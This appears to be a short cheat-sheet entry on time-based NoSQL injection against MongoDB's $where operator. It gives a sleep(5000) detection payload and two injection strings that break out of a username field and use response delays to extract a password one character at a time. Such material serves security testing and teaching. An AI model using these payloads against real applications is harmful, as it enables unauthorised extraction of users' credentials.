Timing based injection


There may be situations where triggering a database error doesn't cause a difference in the application's response. In this sitaution, use {"$where": “sleep(5000)"} to detect difference in the server responses.

Here are two examples implementing the time based search:

  • admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
  • admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
